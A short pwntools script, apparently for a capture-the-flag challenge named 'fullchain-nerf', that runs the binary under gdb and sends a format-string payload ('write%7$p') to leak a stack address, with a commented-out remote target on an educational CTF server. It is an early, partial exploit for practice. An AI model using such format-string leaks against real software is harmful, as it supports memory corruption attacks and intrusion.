from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = remote('edu-ctf.zoolab.org', 30206)
r = process('./fullchain-nerf')

gdb.attach(r)

r.sendafter("global or local > ", b'local\n')
r.sendafter('set read or write > ', b'write%7$p\n')
r.recvuntil('write')
cnt_address = r.recvline()
print(cnt_address)

r.interactive()